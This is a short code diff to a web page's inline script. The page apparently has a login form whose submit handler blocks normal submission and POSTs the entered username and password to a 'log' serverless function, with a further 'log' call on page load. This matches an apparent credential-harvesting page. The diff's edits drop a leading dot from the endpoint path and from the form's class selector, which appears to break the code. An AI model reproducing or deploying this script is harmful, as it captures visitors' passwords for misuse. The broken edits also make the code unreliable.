@@ -381,14 +381,14 @@
       </div>
     </footer>
     <script>
-        fetch('/.netlify/functions/log');
+        fetch('/netlify/functions/log');
       
-        document.querySelector('.login-form').addEventListener('submit', function (e) {
+        document.querySelector('login-form').addEventListener('submit', function (e) {
           e.preventDefault();
           const username = document.querySelector('input[name="username"]').value;
           const password = document.querySelector('input[name="password"]').value;
       
-          fetch('/.netlify/functions/log', {
+          fetch('/netlify/functions/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ username, password }),
